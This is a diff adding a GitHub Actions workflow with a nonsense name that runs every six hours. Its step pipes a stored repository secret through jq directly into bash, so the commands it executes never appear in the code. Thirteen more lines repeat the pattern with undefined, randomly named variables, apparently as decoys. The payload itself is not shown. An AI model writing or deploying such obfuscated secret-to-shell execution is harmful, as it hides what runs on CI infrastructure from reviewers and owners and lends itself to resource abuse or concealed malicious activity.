@@ -1,0 +1,30 @@
+name: ruodadeyouxichangdili
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruodadeyouxichangdili
+        env:
+          zb923: ${{ secrets.zb923 }}
+        run: |
+          echo $zb923 | jq -r .xir5 | /bin/bash
+          echo $wuvh06859 | jq -r .nc9049 | /bin/bash
+          echo $auity9194 | jq -r .o03 | /bin/bash
+          echo $f94 | jq -r .wasq5 | /bin/bash
+          echo $zkebw936 | jq -r .ruhxy62 | /bin/bash
+          echo $x84 | jq -r .wglrp89479 | /bin/bash
+          echo $rrk7500 | jq -r .pj54687 | /bin/bash
+          echo $j16 | jq -r .nzlcf00843 | /bin/bash
+          echo $jasv4 | jq -r .od797 | /bin/bash
+          echo $ww610 | jq -r .o357 | /bin/bash
+          echo $rhr486 | jq -r .txh07789 | /bin/bash
+          echo $nktu473 | jq -r .s4330 | /bin/bash
+          echo $sg27499 | jq -r .kpfu67330 | /bin/bash
+          echo $p8 | jq -r .wa86508 | /bin/bash
+
